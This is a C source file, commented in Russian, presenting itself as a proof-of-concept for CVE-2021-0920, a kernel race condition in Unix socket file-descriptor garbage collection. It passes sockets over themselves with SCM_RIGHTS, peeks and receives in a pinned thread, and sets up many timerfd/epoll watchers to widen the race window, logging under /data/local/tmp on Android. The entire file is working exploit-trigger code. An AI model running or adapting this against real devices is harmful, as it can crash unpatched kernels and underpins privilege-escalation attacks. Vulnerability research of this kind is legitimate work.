#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <stdbool.h>
#include <stdarg.h>

// Сниженные лимиты для безопасного теста
#define MAX_EPOLL_INSTANCES 50
#define MAX_DUP_FDS 20

volatile bool stop_race = false;
FILE* logfile = NULL;

// Функция для логирования в консоль и файл
void log_msg(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
    
    if (logfile) {
        va_start(args, fmt);
        vfprintf(logfile, fmt, args);
        va_end(args);
        fprintf(logfile, "\n");
        fflush(logfile); // Сбрасываем буфер на диск
    }
}

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    if (sendmsg(socket, &msg, 0) < 0) {
        // Игнорируем ошибки отправки в потоке гонки, чтобы не спамить лог
    }
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

// Поток настройки таймера и epoll
void* setup_timer_epoll(void* arg) {
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) { 
        log_msg("[-] timerfd_create failed: %s", strerror(errno)); 
        return NULL; 
    }

    int total_watchers = 0;
    for (int i = 0; i < MAX_EPOLL_INSTANCES; i++) {
        int epfd = epoll_create1(0);
        if (epfd < 0) {
            log_msg("[!] epoll_create1 failed at %d: %s", i, strerror(errno));
            break;
        }
        for (int j = 0; j < MAX_DUP_FDS; j++) {
            int dupfd = dup(tfd);
            if (dupfd < 0) {
                log_msg("[!] dup failed at %d/%d: %s", i, j, strerror(errno));
                break; 
            }
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = dupfd };
            if (epoll_ctl(epfd, EPOLL_CTL_ADD, dupfd, &ev) < 0) {
                log_msg("[!] epoll_ctl failed: %s", strerror(errno));
                close(dupfd);
                break;
            }
            total_watchers++;
        }
    }

    log_msg("[+] Timer/Epoll setup complete. Total watchers: %d", total_watchers);

    // Настраиваем таймер на 1 микросекунду
    struct itimerspec its;
    its.it_value.tv_sec = 0;
    its.it_value.tv_nsec = 1000; 
    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 1000;
    timerfd_settime(tfd, 0, &its, NULL);

    while (!stop_race) {
        pause(); 
    }
    return NULL;
}

// Поток, пытающийся выиграть гонку
void* race_thread(void* arg) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    long iter = 0;
    while (!stop_race) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        // Создаем цикл
        send_fd(sv[0], sv[0]);
        close(sv[0]);

        // Подглядываем и забираем
        int fd = recv_fd(sv[1], MSG_PEEK);
        if (fd >= 0) {
            recv_fd(sv[1], 0);
            close(fd);
        }
        close(sv[1]);

        iter++;
        if (iter % 100000 == 0) {
            log_msg("[*] Race iterations: %ld", iter);
        }
    }
    return NULL;
}

int main() {
    // Отключаем буферизацию stdout
    setbuf(stdout, NULL);
    
    // Открываем лог-файл
    logfile = fopen("/data/local/tmp/race_v8.log", "w");
    log_msg("[*] CVE-2021-0920 Race PoC v8 (Safe Limits + Logging)");

    // Попытка поднять лимит дескрипторов
    struct rlimit rlim;
    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
        log_msg("[*] Current FD limit: soft=%ld, hard=%ld", rlim.rlim_cur, rlim.rlim_max);
        rlim.rlim_cur = rlim.rlim_max; 
        if (setrlimit(RLIMIT_NOFILE, &rlim) == 0) {
            log_msg("[+] Raised FD limit to: %ld", rlim.rlim_cur);
        } else {
            log_msg("[-] setrlimit failed: %s", strerror(errno));
        }
    }

    pthread_t t_setup;
    pthread_create(&t_setup, NULL, setup_timer_epoll, NULL);

    // Даем время на создание epoll-структур
    sleep(2);

    log_msg("[*] Starting race thread...");
    pthread_t t_race;
    pthread_create(&t_race, NULL, race_thread, NULL);

    // Работаем 60 секунд
    sleep(60);
    stop_race = true;

    pthread_join(t_setup, NULL);
    pthread_join(t_race, NULL);

    log_msg("[-] PoC finished without panic.");
    if (logfile) fclose(logfile);
    
    return 0;
}